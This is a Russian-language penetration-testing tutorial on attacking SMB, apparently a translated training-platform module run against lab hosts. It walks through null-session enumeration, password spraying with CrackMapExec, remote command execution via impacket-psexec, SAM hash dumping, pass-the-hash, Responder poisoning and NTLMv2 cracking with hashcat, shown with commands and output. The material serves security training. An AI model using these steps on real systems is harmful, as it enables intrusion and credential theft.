# Атака на SMB

---

Протокол Server Message Block (SMB) — это протокол связи, созданный для обеспечения совместного доступа к файлам и принтерам между узлами сети. Первоначально он был разработан для работы поверх NetBIOS поверх TCP/IP (NBT) с использованием портов TCP `139`и UDP `137`. `138`Однако в Windows 2000 Microsoft добавила возможность запуска SMB непосредственно поверх TCP/IP на порту `445`без дополнительного уровня NetBIOS. В настоящее время современные операционные системы Windows используют SMB поверх TCP, но по-прежнему поддерживают реализацию NetBIOS в качестве резервного варианта.

Samba — это реализация протокола SMB с открытым исходным кодом для Unix/Linux. Она также позволяет серверам Linux/Unix и клиентам Windows использовать одни и те же службы SMB.

Например, в Windows протокол SMB может работать напрямую через порт 445 TCP/IP без необходимости использования NetBIOS поверх TCP/IP, но если в Windows включен NetBIOS или мы ориентируемся на хост, отличный от Windows, мы обнаружим, что SMB работает через порт 139 TCP/IP. Это означает, что SMB работает с использованием NetBIOS поверх TCP/IP.

Еще один протокол, часто связанный с SMB, — это [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_RPC) . RPC предоставляет разработчику приложений универсальный способ выполнения процедуры (или функции) в локальном или удаленном процессе без необходимости понимать сетевые протоколы, используемые для поддержки связи, как указано в [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15) , который определяет RPC поверх протокола SMB, который может использовать именованные каналы протокола SMB в качестве базового транспортного протокола.

Для атаки на SMB-сервер необходимо понимать его реализацию, операционную систему и инструменты, которые можно использовать для злоупотреблений. Как и в случае с другими службами, можно использовать неправильную конфигурацию или чрезмерные привилегии, эксплуатировать известные уязвимости или обнаруживать новые. Кроме того, получив доступ к SMB-службе, при взаимодействии с общей папкой необходимо знать содержимое каталога. Наконец, если целью являются NetBIOS или RPC, необходимо определить, какую информацию можно получить или какие действия можно выполнить над целевым объектом.

---

## Перечисление

В зависимости от реализации SMB и операционной системы, мы получим различную информацию, используя Nmap `Nmap`. Имейте в виду, что при нацеливании на ОС Windows информация о версии обычно не включается в результаты сканирования Nmap. Вместо этого Nmap попытается угадать версию ОС. Однако нам часто понадобятся другие сканирования, чтобы определить, уязвима ли целевая система к конкретному эксплойту. Поиск известных уязвимостей мы рассмотрим позже в этом разделе. А пока давайте просканируем порты TCP 139 и 445.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

Сканирование с помощью Nmap позволяет получить важную информацию о цели:

- Версия SMB (Samba smbd 4.6.2)
- Имя хоста HTB
- Операционная система — Linux, основанная на реализации SMB.

Давайте рассмотрим некоторые распространенные ошибки конфигурации и специфические атаки, связанные с протоколами.

---

## Неправильные настройки

В SMB можно настроить отключение аутентификации, что часто называют «аутентификацией по умолчанию» `null session`. Вместо этого мы можем войти в систему без имени пользователя и пароля.

#### Анонимная аутентификация

Если мы найдем SMB-сервер, который не требует имени пользователя и пароля, или найдем действительные учетные данные, мы сможем получить список общих ресурсов, имен пользователей, групп, разрешений, политик, служб и т. д. Большинство инструментов, взаимодействующих с SMB, допускают подключение с нулевым сеансом, включая `smbclient`, `smbmap`, `rpcclient`, или `enum4linux`. Давайте рассмотрим, как мы можем взаимодействовать с общими файловыми ресурсами и RPC, используя аутентификацию с нулевым сеансом.

#### Совместное использование файлов

С помощью параметра `smbclient`мы можем отобразить список общих ресурсов сервера `-L`, а с помощью параметра `-N`мы указываем `smbclient`использовать нулевую сессию.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap`— это ещё один инструмент, который помогает нам перечислять сетевые ресурсы и получать доступ к связанным с ними разрешениям. Преимуществом является `smbmap`то, что он предоставляет список разрешений для каждой общей папки.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Используя `smbmap`опцию ` `-r`--` или `--` `-R`(рекурсивный режим), можно просматривать каталоги:

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

В приведенном выше примере права доступа установлены на `READ`и `WRITE`, которые можно использовать для загрузки и скачивания файлов.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

#### Удаленный вызов процедур (RPC)

Мы можем использовать этот `rpcclient`инструмент с нулевой сессией для перечисления рабочих станций или контроллеров домена.

Этот `rpcclient`инструмент предоставляет множество различных команд для выполнения определенных функций на SMB-сервере с целью сбора информации или изменения атрибутов сервера, таких как имя пользователя. Мы можем использовать эту [шпаргалку от Института SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) или ознакомиться с полным списком всех этих функций на странице руководства [(man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)`rpcclient` ) .

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux`— ещё одна утилита, поддерживающая нулевые сессии, и она использует `nmblookup`, `net`, `rpcclient`, и `smbclient`для автоматизации некоторых распространённых операций перечисления из целевых объектов SMB, таких как:

- Название рабочей группы/домена
- Информация о пользователях
- Информация об операционной системе
- Информация о группах
- Общие папки
- Информация о политике паролей

Первоначальный [инструмент](https://github.com/CiscoCXSecurity/enum4linux) был написан на Perl, а затем [переписан Марком Лоу на Python](https://github.com/cddmp/enum4linux-ng) .

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.11.45
[*] Username ......... ''
[*] Random Username .. 'noyyglci'
[*] Password ......... ''

 ====================================
|    Service Scan on 10.10.11.45     |
 ====================================
[*] Checking LDAP (timeout: 5s)
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

---

## Атаки, основанные на специфике протокола.

Если нулевая сессия не включена, нам потребуются учетные данные для взаимодействия с протоколом SMB. Два распространенных способа получения учетных данных — это [перебор паролей](https://en.wikipedia.org/wiki/Brute-force_attack) и [распыление паролей](https://owasp.org/www-community/attacks/Password_Spraying_Attack) .

#### Метод перебора паролей и распыление паролей

При использовании метода перебора мы пытаемся подобрать как можно больше паролей к учетной записи, но достижение порогового значения может привести к блокировке аккаунта. Если пороговое значение известно, можно использовать метод перебора и остановиться до его достижения. В противном случае, мы не рекомендуем использовать метод перебора.

Перебор паролей — лучшая альтернатива, поскольку мы можем выбрать список имен пользователей с одним общим паролем, чтобы избежать блокировки учетных записей. Мы можем попробовать несколько паролей, если знаем порог блокировки учетной записи. Как правило, две-три попытки безопасны, при условии, что между ними есть перерыв в 30-60 минут. Давайте рассмотрим инструмент [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) , который позволяет выполнять перебор паролей.

С помощью CrackMapExec (CME) мы можем атаковать несколько IP-адресов, используя множество пользователей и паролей. Рассмотрим повседневный пример использования перебора паролей. Для перебора паролей на одном IP-адресе мы можем использовать опцию `-u`указания файла со списком пользователей и `-p`указать пароль. Это попытается аутентифицировать каждого пользователя из списка, используя предоставленный пароль.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Примечание:** По умолчанию CME завершает работу после успешного входа в систему. Использование этого `--continue-on-success`флага позволит продолжить перебор паролей даже после обнаружения действительного пароля. Это очень полезно для перебора одного пароля для большого списка пользователей. Кроме того, если мы нацелены на компьютер, не входящий в домен, нам потребуется использовать опцию `--local-auth`. Более подробное изучение перебора паролей см. в модуле «Перечисление и атаки на Active Directory».

[Более подробные инструкции по использованию см. в документации](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials) к инструменту .

#### МСП

Серверы SMB под управлением Linux и Windows предоставляют разные пути атаки. Обычно в среде Linux мы получаем доступ только к файловой системе, злоупотребляем привилегиями или используем известные уязвимости, как мы обсудим позже в этом разделе. Однако в Windows поверхность атаки значительно шире.

При атаке на Windows SMB-сервер наши действия будут ограничены привилегиями пользователя, права которого мы имеем при взломе системы. Если этот пользователь является администратором или обладает определенными привилегиями, мы сможем выполнять такие операции, как:

- Удаленное выполнение команд
- Извлечение хешей из базы данных SAM
- Перечисление авторизованных пользователей
- Pass-the-Hash (PTH)

Давайте обсудим, как мы можем выполнять подобные операции. Кроме того, мы узнаем, как протокол SMB может быть использован для получения хеша пользователя с целью повышения привилегий или получения доступа к сети.

#### Удаленное выполнение кода (RCE)

Прежде чем перейти к тому, как выполнить команду на удаленной системе с использованием SMB, давайте поговорим о Sysinternals. Веб-сайт Windows Sysinternals был создан в 1996 году [Марком Руссиновичем](https://en.wikipedia.org/wiki/Mark_Russinovich) и [Брайсом Когсвеллом](https://en-academic.com/dic.nsf/enwiki/2358707) для предоставления технических ресурсов и утилит для управления, диагностики, устранения неполадок и мониторинга среды Microsoft Windows. Microsoft приобрела Windows Sysinternals и ее активы 18 июля 2006 года.

Компания Sysinternals выпустила несколько бесплатных инструментов для администрирования и мониторинга компьютеров под управлением Microsoft Windows. Сейчас эти программы можно найти на [веб-сайте Microsoft](https://docs.microsoft.com/en-us/sysinternals/) . Одним из таких бесплатных инструментов для удаленного администрирования является PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) — это инструмент, позволяющий запускать процессы на других системах, обеспечивая полную интерактивность для консольных приложений, без необходимости ручной установки клиентского программного обеспечения. Он работает благодаря наличию образа службы Windows внутри исполняемого файла. Этот образ службы развертывается в общей папке admin$ (по умолчанию) на удаленной машине. Затем он использует интерфейс DCE/RPC по протоколу SMB для доступа к API диспетчера служб Windows. Далее он запускает службу PSExec на удаленной машине. После этого служба PSExec создает [именованный канал](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) , который может отправлять команды в систему.

Мы можем загрузить PsExec с [веб-сайта Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) или использовать некоторые реализации для Linux:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) — пример функциональности, аналогичной PsExec, на Python с использованием [RemComSvc](https://github.com/kavika13/RemCom) .
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) — подход, аналогичный PsExec, но без использования [RemComSvc](https://github.com/kavika13/RemCom) . Техника описана [здесь](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access) . Эта реализация идет еще дальше, создавая локальный SMB-сервер для приема вывода команд. Это полезно, когда на целевой машине НЕТ доступной для записи общей папки.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) — В этом примере выполняется команда на целевой машине через службу планировщика задач и возвращается результат выполнения команды.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) — включает в себя реализацию `smbexec`и `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) — реализация PsExec на Ruby.

#### Impacket PsExec

Для использования `impacket-psexec`нам необходимо указать домен/имя пользователя, пароль и IP-адрес целевого компьютера. Для получения более подробной информации можно использовать справку impacket:

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

Для подключения к удалённому компьютеру с использованием локальной учётной записи администратора `impacket-psexec`можно использовать следующую команду:

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

`impacket-smbexec`К параметрам и относятся те же самые варианты `impacket-atexec`.

#### CrackMapExec

Ещё один инструмент, который можно использовать для запуска CMD или PowerShell, — это PowerShell `CrackMapExec`. Одним из преимуществ PowerShell `CrackMapExec`является возможность запуска команды на нескольких хостах одновременно. Для его использования необходимо указать протокол, `smb`IP-адрес или диапазон IP-адресов, параметр `-u`имени пользователя, `-p`пароль и параметр `-x`для запуска команд CMD или регистр символов `-X`для запуска команд PowerShell.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Примечание:** Если параметр `--exec-method`не определен, CrackMapExec попытается выполнить метод atexec; если это не удастся, вы можете попробовать указать smbexec `--exec-method`.

#### Перечисление авторизованных пользователей

Представьте, что мы находимся в сети с множеством компьютеров. Некоторые из них используют одну и ту же локальную учетную запись администратора. В этом случае мы могли бы использовать команду `CrackMapExec`для перечисления вошедших в систему пользователей на всех компьютерах в одной сети `10.10.110.17/24`, что ускорило бы процесс перечисления.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

#### Извлечение хешей из базы данных SAM

Менеджер учетных записей безопасности (SAM) — это файл базы данных, в котором хранятся пароли пользователей. Он может использоваться для аутентификации локальных и удаленных пользователей. При наличии административных привилегий на компьютере можно извлечь хеши из базы данных SAM для различных целей:

- Пройдите аутентификацию под другим пользователем.
- Взлом паролей: если нам удастся взломать пароль, мы сможем попытаться использовать его для других сервисов или учетных записей.
- Передайте хэштег. Мы обсудим это позже в этом разделе.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

#### Pass-the-Hash (PtH)

Если нам удастся получить NTLM-хеш пользователя, и если мы не сможем его взломать, мы все равно сможем использовать этот хеш для аутентификации по протоколу SMB с помощью метода, называемого Pass-the-Hash (PtH). PtH позволяет злоумышленнику аутентифицироваться на удаленном сервере или в службе, используя базовый NTLM-хеш пароля пользователя вместо пароля в открытом виде. Мы можем использовать атаку PtH с любым `Impacket`инструментом, включая, например `SMBMap`, , `CrackMapExec`, , . Вот пример того, как это будет работать с `CrackMapExec`:

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

#### Атаки с принудительной аутентификацией

[Мы также можем злоупотреблять протоколом SMB, создав поддельный SMB-сервер для перехвата хешей NetNTLM v1/v2](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) пользователей .

Наиболее распространенным инструментом для выполнения таких операций является Responder `Responder`. [Responder](https://github.com/lgandx/Responder) — это инструмент для перехвата LLMNR, NBT-NS и MDNS-трафика с различными возможностями, одна из которых — возможность создания поддельных сервисов, включая SMB, для кражи хешей NetNTLM v1/v2. В конфигурации по умолчанию он будет обнаруживать трафик LLMNR и NBT-NS. Затем он будет отвечать от имени серверов, которые ищет жертва, и перехватывать их хеши NetNTLM.

Давайте рассмотрим пример, чтобы лучше понять, как `Responder`это работает. Представьте, что мы создали фиктивный SMB-сервер, используя конфигурацию Responder по умолчанию, с помощью следующей команды:

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ responder -I <interface name>
```

Когда пользователь или система пытаются выполнить разрешение имени (Name Resolution, NR), машина выполняет ряд процедур для получения IP-адреса хоста по его имени. На машинах под управлением Windows эта процедура будет примерно следующей:

- Требуется указать IP-адрес общего файлового ресурса, являющегося именем хоста.
- Будет выполнена проверка локального файла hosts (C:\Windows\System32\Drivers\etc\hosts) на наличие подходящих записей.
- Если записи не найдены, машина переключается на локальный DNS-кэш, который отслеживает недавно разрешенные имена.
- Отсутствует локальная DNS-запись? Запрос будет отправлен на настроенный DNS-сервер.
- Если все остальные способы не сработают, машина отправит многоадресный запрос, запрашивая IP-адрес общего файлового ресурса у других машин в сети.

Предположим, пользователь ошибочно ввел имя общей папки `\\mysharefoder\`вместо `\\mysharedfolder\`. В этом случае все попытки разрешения имен завершатся неудачей, поскольку такое имя не существует, и машина отправит многоадресный запрос всем устройствам в сети, включая наш поддельный SMB-сервер. Это проблема, поскольку не принимаются никакие меры для проверки целостности ответов. Злоумышленники могут воспользоваться этим механизмом, перехватывая такие запросы и подделывая ответы, заставляя жертву поверить в надежность вредоносных серверов. Это доверие обычно используется для кражи учетных данных.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Эти перехваченные учетные данные можно взломать с помощью [hashcat](https://hashcat.net/hashcat/) или передать на удаленный хост для завершения аутентификации и выдачи себя за пользователя.

Все сохраненные хеши находятся в каталоге логов Responder ( `/usr/share/responder/logs/`). Мы можем скопировать хеш в файл и попытаться взломать его с помощью модуля hashcat 5600.

**Примечание:** Если вы видите несколько хешей для одной учетной записи, это потому, что NTLMv2 использует как клиентскую, так и серверную проверку подлинности, которая генерируется случайным образом для каждого взаимодействия. Это приводит к тому, что отправляемые хеши «солятся» случайной строкой чисел. Именно поэтому хеши не совпадают, но все равно представляют один и тот же пароль.

  Атака на SMB

```shell-session
MuraMitchi@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
